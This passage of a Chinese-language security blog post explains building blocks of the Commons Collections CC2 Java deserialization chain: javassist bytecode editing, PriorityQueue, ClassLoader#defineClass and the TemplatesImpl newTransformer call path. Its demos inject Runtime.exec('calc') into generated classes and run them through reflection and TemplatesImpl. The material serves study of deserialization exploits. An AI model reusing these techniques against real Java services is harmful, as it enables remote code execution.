class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对类的方法进行操作</span></span><br><span class="line">        CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        ctm.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-1.png" title="实现方法"></p><h3 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h3><p>表示类中的构造函数<br>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;Exp&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool.makeClass(<span class="string">&quot;Exp2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist调用了构造方法\&quot;);&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="生成字节码toBytecode"><a href="#生成字节码toBytecode" class="headerlink" title="生成字节码toBytecode()"></a>生成字节码toBytecode()</h3><p>生成字节码：CtClass.toBytecode()</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//生成字节码</span></span><br><span class="line"><span class="type">byte</span>[] bt=ct.toBytecode();</span><br><span class="line"><span class="comment">//输出字节码</span></span><br><span class="line">String str=Arrays.toString(bt);</span><br><span class="line">System.out.print(str);</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-4.png" title="toBytecode()"></p><h3 id="生成对象toClass"><a href="#生成对象toClass" class="headerlink" title="生成对象toClass()"></a>生成对象toClass()</h3><p>反射调用对象:CtClass.toClass()</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用对象</span></span><br><span class="line">Class cla=ct.toClass();</span><br><span class="line"><span class="comment">//实例化对象</span></span><br><span class="line">Object o=cla.newInstance();</span><br></pre></td></tr></table></figure><h3 id="简单实现demo"><a href="#简单实现demo" class="headerlink" title="简单实现demo"></a>简单实现demo</h3><p>实例类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> String addr;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">       <span class="built_in">this</span>.name=name;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddr</span><span class="params">(String addr)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.addr=addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddr</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">       ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">       ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//获取类Exp</span></span><br><span class="line">       CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">       <span class="comment">//创建新类Exp2</span></span><br><span class="line">       CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//对类的方法进行操作</span></span><br><span class="line">       CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">       ctm.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//创建构造函数</span></span><br><span class="line">       CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">       <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">       cons.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist调用了构造方法\&quot;);&quot;</span>);</span><br><span class="line">       ct.defrost();</span><br><span class="line">       ct.writeFile(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>实现更改字节码效果：</p><p><img src="/posts/7e30cd4a/cc2-2.png" title="实现效果"></p><p>触发恶意代码效果demo:<br>通过向构造函数插入执行代码，通过反射调用CtClass对象并转换为反射类对象，进行实例化的时候调用构造函数触发恶意代码。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">       ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">       ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//获取类Exp</span></span><br><span class="line">       CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">       <span class="comment">//创建新类Exp2</span></span><br><span class="line">       CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//对类的方法进行操作</span></span><br><span class="line">       CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">       ctm.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//创建构造函数</span></span><br><span class="line">       CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">       <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">       cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">       <span class="comment">//ct.writeFile(&quot;People2&quot;);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//通过反射调用对象</span></span><br><span class="line">       Class cla=ct.toClass();</span><br><span class="line">       <span class="comment">//实例化对象</span></span><br><span class="line">       Object o=cla.newInstance();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-3.png" title="恶意代码实现效果"></p><h2 id="PriorityQueue优先级队列"><a href="#PriorityQueue优先级队列" class="headerlink" title="PriorityQueue优先级队列"></a>PriorityQueue优先级队列</h2><blockquote><p>PriorityQueue类在Java1.5中引入。PriorityQueue是基于优先堆的一个无界队列，这个优先队列中的元素可以默认自然排序或者通过提供的Comparator（比较器）在队列实例化的时排序。要求使用Java Comparable和Comparator接口给对象排序，并且在排序时会按照优先级处理其中的元素。</p></blockquote><p>顾名思义，它是队列的一种实现方式，但不同于普通队列Queue（先进先出），它可通过比较器Comparator实现数据之间谁排在前面谁排在后面（上沉该元素）。</p><p>PriorityQueue队列常用方法：</p><ul><li>add()：添加数组元素，添加失败会抛出异常。</li><li>offer()：添加数组元素，添加失败会返回false。</li><li>poll()：取出队顶数组元素，并删除该元素，失败会抛出异常。</li><li>peek()：查询队顶数组元素，但不删除该元素。</li><li>remove(): 取出队顶数组元素，并删除该元素，失败会返回null。</li></ul><p>PriorityQueue队列实现用法：</p><ul><li>PriorityQueue<Integer> queue&#x3D;new PriorityQueue&lt;&gt;(); &#x2F;&#x2F;默认优先级队列，规则从小到大</Integer></li><li>PriorityQueue<Integer> queue&#x3D;new PriorityQueue&lt;&gt;( (a,b)-&gt;(b-a)); &#x2F;&#x2F;设置比较器，从大到小排列</Integer></li></ul><p>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//默认优先级队列</span></span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//设置了比较规则的优先级队列</span></span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq2=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;( (a,b)-&gt;(b-a));</span><br><span class="line"></span><br><span class="line">        pq.add(<span class="number">3</span>);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">        pq.add(<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//默认优先级队列输出，默认从小到大</span></span><br><span class="line">        System.out.print(<span class="string">&quot;默认优先级队列输出:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.print(pq.poll());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        pq2.add(<span class="number">3</span>);</span><br><span class="line">        pq2.add(<span class="number">1</span>);</span><br><span class="line">        pq2.add(<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//默认优先级队列输出</span></span><br><span class="line">        System.out.print(<span class="string">&quot;设置比较器优先级队列输出:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.print(pq2.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-13.png" title="优先级队列"></p><p>自定义使用方法：</p><ul><li>类实现了Comparable接口，定义了比较方法，直接使用即可PriorityQueue&lt;类名&gt; queue&#x3D;new PriorityQueue&lt;&gt;();</li><li>当传递对象元素未实现Comparable接口，可自定义新Comparable<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue&lt;People&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;People&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(People o1, People o2)</span> &#123;</span><br><span class="line">                <span class="comment">////判断数值从大到小，如果第一个元素数值比第二个大，返回1标识顺序正确，否则返回-1</span></span><br><span class="line">                <span class="keyword">return</span> o1.getAge()-o2.getAge()&gt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></li></ul><p>其中进行判断的比较器参数o1,o2，其中o1表示新插入的元素，o2表示被比较的元素也就是插入的前面一个元素。其中最后return 1表示当前比较的两个元素顺序正确，-1表示顺序不正确，不正确后将新插入的元素进行上沉操作（也就是向前排），然后循环比较上沉后的前面一个元素，继续判断直到顺序正确。</p><p><img src="/posts/7e30cd4a/cc2-14.png" title="参数描述"></p><p>简单实现效果：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PriorityQueue&lt;People&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;People&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(People o1, People o2)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> o1.getAge()-o2.getAge()&gt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>; <span class="comment">//判断数值从大到小，如果第一个元素数值比第二个大，返回1标识顺序正确，否则返回-1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;默认添加顺序:&quot;</span>);</span><br><span class="line">        People people1=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小痴&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        People people2=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小笨&quot;</span>,<span class="number">26</span>);</span><br><span class="line">        People people3=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小臭&quot;</span>,<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;经过比较器后的顺序:&quot;</span>);</span><br><span class="line">        pq.add(people1);</span><br><span class="line">        pq.add(people2);</span><br><span class="line">        pq.add(people3);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.println(pq.poll().show());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-15.png" title="实现"></p><h2 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h2><p>ClassLoader为类加载器，可以将字节码文件(.class文件)，通过loadClass函数加载类名，返回一个Class对象，同时ClassLoader类下面存在defineClass方法，可以将byte[]字节数组信息还原成一个Class对象，在学javassist中，了解到javassist可以动态生成字节码文件，包括了一些恶意代码文件，可进而通过ClassLoader类加载器将这些恶意的字节码文件转化为java类进行调用，达到执行恶意代码的目的</p><p>其中类加载阶段：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader#loadClass（类加载，从类缓或父加载器等位置寻找类）</span><br><span class="line">    ——&gt; ClassLoader#findClass（寻找类，通过URL制定的方式加载字节码）</span><br><span class="line">        ——&gt; ClassLoader#defineClass（定义类，通过获取的字节码转换成类对象）</span><br></pre></td></tr></table></figure><p>由于ClassLoader#defineClass方法为protect修饰，因此可通过反射进行调用</p><p>简单实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//ct.writeFile(&quot;./&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bt=ct.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用ClassLoader#defineClass</span></span><br><span class="line">        Method define=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class ,<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        define.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class cla=(Class)define.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;People2&quot;</span>,bt,<span class="number">0</span>,bt.length);</span><br><span class="line">        cla.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-25.png" title="defineClass实现"></p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>TemplatesImpl这个类简述功能就是对xsl格式文件生成的字节码转换成XSLTC模板对象，期间会处理字节码，因此重写了defineClass方法，具体描述可查看<a href="https://www.anquanke.com/post/id/247044">TemplatesImpl了解</a></p><p><img src="/posts/7e30cd4a/cc2-26.png" title="重写defineClass"></p><p>重写了<code>defineClass</code>方法，并且没有定义域，可以在其他类进行调用使用，而<code>ClassLoader#defineClass</code>定义域是受保护的，在很多情况中调用受限，因此这也是<code>TransletClassLoader#defineClass</code>作为很多序列化漏洞入口，而不是使用<code>ClassLoader#defineClass</code></p><p>但该<code>defineClass()</code>的调用并不会实例化，需要通过<code>newInstance()</code>进行实例化。</p><p>依次看调用情况</p><h3 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses()"></a>defineTransletClasses()</h3><p><code>defineClass</code>在<code>defineTransletClasses</code>方法中被调用</p><p><img src="/posts/7e30cd4a/cc2-27.png" title="defineClass调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_bytecodes</code>不能为空，为空会直接抛出异常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_tfactory</code>需要实例化<br>创建的<code>TransletClassLoader</code>(Translet类的加载器)对象，其中<code>_tfactory.getExternalExtensionsMap()</code>中的<code>_tfactory</code>对象为<code>TransformerFactoryImpl</code>类对象，等同于调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法，但其中<code>_tfactory</code>对象初始赋值为null，直接执行会报错，因此需要将<code>_tfactory</code>进行实例化，才能调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">           AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">               <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br></pre></td></tr></table></figure><p>两种实现方法都可以实例化，第一种通过<code>TransformerFactoryImpl()</code>构造方法实现实例化对象，第二种通过反射直接实现实例化对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure></li><li><p><code>父类需要为ABSTRACT_TRANSLET</code>类<br>通过for循环对字节文件类进行循环定义并赋值给class数组，其中会判断当前获取的字节类的父类是否为<code>ABSTRACT_TRANSLET</code>类，是的话会讲该类序号赋值给<code>_transletIndex</code>，否则不是的话会抛出异常（表意为只有存在父类为<code>ABSTRACT_TRANSLET</code>类的<code>translet</code>类才能被实例化），从而在<code>getTransletInstance</code>类中的<code>AbstractTranslet</code>实例化步骤将父类为<code>ABSTRACT_TRANSLET</code>的类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">               _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">               <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">               <span class="comment">// Check if this is the main class</span></span><br><span class="line">               <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                   _transletIndex = i;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_bytecodes</code>字节码需要设置为byte[][]数组，<code>_bytecodes</code>变量声明为byte[][]类型，如果直接通过javassist toBytecode()生成byte[]数组运行会报错。<br><img src="/posts/7e30cd4a/cc2-33.png" title="_bytecodes数组"><br><img src="/posts/7e30cd4a/cc2-34.png" title="_bytecodes数组"><br>因此需要将一维数组转化为二维数组。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br></pre></td></tr></table></figure></li></ol><p>接着查看<code>defineTransletClasses</code>方法的上层调用情况<br>其中有三处对该方法进行了调用，其中只用<code>getTransletInstance</code>方法有上层调用，其他两个方法没有被其他方法进行调用。</p><p><img src="/posts/7e30cd4a/cc2-28.png" title="getTransletInstance调用"></p><h3 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h3><p><img src="/posts/7e30cd4a/cc2-29.png" title="getTransletInstance调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_name</code>不能为空，为空会直接返回<code>null</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>_class</code>必须为空，才能调用<code>defineTransletClasses</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br></pre></td></tr></table></figure></li></ol><p>最后通过创建<code>AbstractTranslet</code>对象将class文件类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><p>接着查看<code>getTransletInstance</code>方法的上层调用情况</p><p><img src="/posts/7e30cd4a/cc2-30.png" title="getTransletInstance调用"></p><p><code>newTransformer()</code>方法进行了调用</p><h3 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h3><p>在调用构造函数的时候调用了<code>getTransletInstance</code>方法，返回Translet类的实例，其中没有需要的满足条件。</p><p>接着查看<code>newTransformer()</code>方法的上层调用情况</p><p><img src="/posts/7e30cd4a/cc2-31.png" title="newTransformer调用"></p><p>其中有5处显示进行了调用，但只有<code>getOutputProperties</code>方法调用的本类的<code>newTransformer()</code>方法，其他四种都是调用的其他类重写的<code>newTransformer()</code>方法。</p><h3 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties()"></a>getOutputProperties()</h3><p><img src="/posts/7e30cd4a/cc2-32.png" title="getOutputProperties调用"></p><p>该方法直接执行了<code>newTransforme</code>方法，没有其他条件限制，查询<code>getOutputProperties</code>的上层调用，没有在本类发现其调用，因此最后的执行方法就在<code>getOutputProperties</code></p><h3 id="完整链"><a href="#完整链" class="headerlink" title="完整链"></a>完整链</h3><p>到<code>newTransformer</code>方法执行就能达到触发了，他上层<code>getOutputProperties</code>方法也进行了调用，也可以算进去当作延伸出来的链。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties()</span><br><span class="line">    newTransformer()</span><br><span class="line">        getTransletInstance()</span><br><span class="line">            defineTransletClasses()</span><br><span class="line">                defineClass()</span><br></pre></td></tr></table></figure><h3 id="实现demo"><a href="#实现demo" class="headerlink" title="实现demo"></a>实现demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化，效果等同于new TransformerFactoryImpl()</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">        <span class="comment">//执行newTransformer()方法</span></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">        <span class="comment">//执行getOutputProperties(),getOutputProperties为newTransformer上层调用，执行效果相同，就是多了个执行步骤</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-35.png" title="实现demo"></p><p>其中的空指针的报错原因是在赋值传递变量时没有指向对象，然后在调用时直接通过该变量去调用对应的方法导致报错，但不影响执行效果。</p><h1 id="0x04、CC2利用链分析"><a href="#0x04、CC2利用链分析" class="headerlink" title="0x04、CC2利用链分析"></a>0x04、CC2利用链分析</h1><h2 id="逆推调用链"><a href="#逆推调用链" class="headerlink" 